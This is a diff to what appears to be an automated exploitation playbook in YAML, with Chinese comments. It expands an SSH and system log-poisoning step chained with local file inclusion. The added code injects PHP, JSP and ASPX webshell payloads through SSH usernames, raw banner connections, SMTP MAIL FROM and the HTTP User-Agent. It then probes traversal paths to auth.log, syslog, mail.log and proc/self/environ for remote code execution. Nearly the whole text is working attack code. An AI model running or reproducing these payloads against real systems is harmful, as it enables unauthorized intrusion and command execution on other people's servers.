@@ -410,9 +410,46 @@ exploit_paths:
       lfi_confirmed: true
     steps:
       - id: log_poison_ssh
-        description: "SSH 日志注入 + LFI 包含 auth.log（使用已确认参数和深度）"
+        description: "SSH/系统日志注入 + LFI 包含（多 payload + 多日志路径，按目标语言分叉）"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+
+          # ── 指纹探测：识别目标 webshell 语言（内联 dispatcher）──
+          HEADERS=$(curl -sI --max-time 5 "$BASE/" 2>/dev/null)
+          EXT_MATCH=$(echo "{ENDPOINT}" | grep -oE '\.(php|jsp|jspx|asp|aspx|do|action)([?#]|$)' | head -1 | tr -d '?#')
+          LANG="php"
+          if echo "$HEADERS" | grep -qiE 'x-powered-by:\s*php|^Server:.*php'; then
+            LANG=php
+          elif echo "$HEADERS" | grep -qiE 'x-powered-by:\s*asp\.net|^Server:.*iis'; then
+            LANG=aspx
+          elif echo "$HEADERS" | grep -qiE '^Server:.*tomcat|^Server:.*jetty|jsessionid'; then
+            LANG=jsp
+          elif [ "$EXT_MATCH" = ".php" ]; then
+            LANG=php
+          elif [ "$EXT_MATCH" = ".jsp" ] || [ "$EXT_MATCH" = ".jspx" ] || \
+               [ "$EXT_MATCH" = ".do" ] || [ "$EXT_MATCH" = ".action" ]; then
+            LANG=jsp
+          elif [ "$EXT_MATCH" = ".asp" ] || [ "$EXT_MATCH" = ".aspx" ]; then
+            LANG=aspx
+          fi
+          echo "[INFO] detected webshell lang: $LANG"
+
+          # ── 选 payload 矩阵（按语言）──
+          case "$LANG" in
+            jsp)
+              PAYLOADS='<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
+              echo "[WARN] JSP 目标通过 LFI 包含日志文件执行 JSP 命中率极低（需要 include 任意扩展为 JSP），" \
+                   "优先尝试 Tomcat PUT/WAR 路径。当前仅作兜底尝试。"
+              ;;
+            aspx)
+              PAYLOADS='<%@ Page Language="C#"%><%Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd());%>'
+              echo "[WARN] ASPX 目标日志投毒命中率低，仅作兜底"
+              ;;
+            *)
+              # PHP 多 payload（用 @@ 分隔；主 payload + 反引号短 payload + passthru + eval）
+              PAYLOADS='<?php system($_GET["cmd"]);?>@@<?=`id`?>@@<?php passthru($_GET["cmd"]);?>@@<?php eval($_GET["c"]);?>'
+              ;;
+          esac
 
           # SSH 端口选择顺序：
           #   1) check_ssh_port 探针捕获的 {ssh_port}
@@ -423,8 +460,7 @@ exploit_paths:
             SSH_PORT=22
           fi
 
-          PAYLOAD='<?php system($_GET["cmd"]);?>'
-          echo "=== SSH Log Poisoning ==="
+          echo "=== SSH/系统日志 Poisoning (lang=$LANG) ==="
           echo "[INFO] SSH poison target: {TARGET_IP}:$SSH_PORT"
 
           # 先快速确认 SSH 端口真的可达，避免空打日志注入浪费时间
@@ -433,21 +469,38 @@ exploit_paths:
             SSH_UNREACHABLE=1
           fi
           exec 3>&- 3<&- 2>/dev/null || true
-          SSH_ERR=$(sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
-            -p "$SSH_PORT" \
-            "$PAYLOAD"@{TARGET_IP} 2>&1 || true)
-          echo "$SSH_ERR" | head -3
 
-          if echo "$SSH_ERR" | grep -qi "invalid characters"; then
-            echo "[INFO] OpenSSH rejected username payload, fallback to SSH banner poisoning"
-            if command -v nc >/dev/null 2>&1; then
-              printf '%s\r\n' "$PAYLOAD" | nc -w 3 {TARGET_IP} "$SSH_PORT" >/dev/null 2>&1 || true
-            else
-              (exec 3<>/dev/tcp/{TARGET_IP}/"$SSH_PORT" && \
-               printf '%s\r\n' "$PAYLOAD" >&3 && sleep 1 && \
-               exec 3>&- 3<&-) >/dev/null 2>&1 || true
+          # 把 PAYLOADS 按 @@ 分隔拆分，每个 payload 都走一遍用户名注入 + banner 回退
+          OLDIFS="$IFS"
+          IFS='@@'
+          set -f
+          # 兼容 POSIX sh：用 awk 拆分，每行一个 payload
+          echo "$PAYLOADS" | awk -v RS='@@' 'length{print}' | while IFS= read -r P; do
+            [ -z "$P" ] && continue
+            echo "[POISON] trying payload: ${P} (len=${#P})"
+            [ -z "$SSH_UNREACHABLE" ] && \
+              SSH_ERR=$(sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+                -p "$SSH_PORT" "$P"@{TARGET_IP} 2>&1 || true) && \
+              echo "$SSH_ERR" | head -2
+            # OpenSSH 拒绝含特殊字符的用户名 → 回落到 banner 投毒（进 syslog/messages）
+            if [ -n "$SSH_ERR" ] && echo "$SSH_ERR" | grep -qi "invalid characters"; then
+              if command -v nc >/dev/null 2>&1; then
+                printf '%s\r\n' "$P" | nc -w 2 {TARGET_IP} "$SSH_PORT" >/dev/null 2>&1 || true
+              else
+                (exec 3<>/dev/tcp/{TARGET_IP}/"$SSH_PORT" && \
+                 printf '%s\r\n' "$P" >&3 && sleep 1 && \
+                 exec 3>&- 3<&-) >/dev/null 2>&1 || true
+              fi
             fi
-          fi
+            # PHP + 开放 25 端口时，顺手投毒 mail.log（MAIL FROM:<payload>）
+            if [ "$LANG" = "php" ] && (exec 3<>/dev/tcp/{TARGET_IP}/25) 2>/dev/null; then
+              exec 3>&- 3<&- 2>/dev/null || true
+              (printf 'EHLO x\r\nMAIL FROM:<%s>\r\nQUIT\r\n' "$P" | \
+                nc -w 3 {TARGET_IP} 25 >/dev/null 2>&1) || true
+            fi
+          done
+          IFS="$OLDIFS"
+          set +f
           sleep 2
 
           CONFIRMED_PARAM="{lfi_param}"
@@ -463,11 +516,20 @@ exploit_paths:
             PARAMS="page file include path image content template"
           fi
 
-          for logpath in var/log/auth.log var/log/secure var/log/sshd.log; do
+          # 扩展日志路径矩阵：SSH / 系统 / 邮件
+          LOG_TARGETS="var/log/auth.log var/log/secure var/log/sshd.log \
+                       var/log/messages var/log/syslog \
+                       var/log/mail.log var/log/maillog"
+          # PHP 还可以尝试 session/environ 类（环境允许时）
+          if [ "$LANG" = "php" ]; then
+            LOG_TARGETS="$LOG_TARGETS proc/self/environ"
+          fi
+
+          for logpath in $LOG_TARGETS; do
             if [ "$LFI_STYLE" = "absolute" ] && [ -n "$CONFIRMED_PARAM" ]; then
-              URL="$BASE/?$CONFIRMED_PARAM=/$logpath&cmd=id"
+              URL="$BASE/?$CONFIRMED_PARAM=/$logpath&cmd=id&c=system('id');"
               echo "[PROBE-ABS] $URL"
-              result=$(curl -s "$URL" --max-time 8 2>/dev/null)
+              result=$(curl -s "$URL" --max-time 8 -A "<?php system(\$_GET['cmd']);?>" 2>/dev/null)
               if echo "$result" | grep -qE 'uid=[0-9]+'; then
                 echo "[HIT] SSH_LOG_POISON_RCE:$CONFIRMED_PARAM:0:$logpath"
                 echo "$result" | grep "uid="
@@ -477,9 +539,9 @@ exploit_paths:
             if [ -n "$CONFIRMED_DEPTH" ] && [ "$CONFIRMED_DEPTH" != "0" ]; then
               TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
               for param in $PARAMS; do
-                URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
+                URL="$BASE/?$param=${TRAV}${logpath}&cmd=id&c=system('id');"
                 echo "[PROBE] $URL"
-                result=$(curl -s "$URL" --max-time 8 2>/dev/null)
+                result=$(curl -s "$URL" --max-time 8 -A "<?php system(\$_GET['cmd']);?>" 2>/dev/null)
                 if echo "$result" | grep -qE 'uid=[0-9]+'; then
                   echo "[HIT] SSH_LOG_POISON_RCE:$param:$CONFIRMED_DEPTH:$logpath"
                   echo "$result" | grep "uid="
@@ -493,11 +555,11 @@ exploit_paths:
             echo "[WARN] LFI depth 未确认，启用受控回退深度(3 5 7)"
             for depth in 3 5 7; do
               TRAV=$(printf '../%.0s' $(seq 1 $depth))
-              for logpath in var/log/auth.log var/log/secure var/log/sshd.log; do
+              for logpath in $LOG_TARGETS; do
                 for param in $PARAMS; do
-                  URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
+                  URL="$BASE/?$param=${TRAV}${logpath}&cmd=id&c=system('id');"
                   echo "[PROBE] $URL"
-                  result=$(curl -s "$URL" --max-time 8 2>/dev/null)
+                  result=$(curl -s "$URL" --max-time 8 -A "<?php system(\$_GET['cmd']);?>" 2>/dev/null)
                   if echo "$result" | grep -qE 'uid=[0-9]+'; then
                     echo "[HIT] SSH_LOG_POISON_RCE:$param:$depth:$logpath"
                     echo "$result" | grep "uid="
@@ -508,7 +570,7 @@ exploit_paths:
             done
           fi
           echo "SSH_LOG_POISON_FAILED"
-        timeout: 90
+        timeout: 120
         success_criteria:
           stdout_regex: "uid=[0-9]+"
         on_success: conclude_success
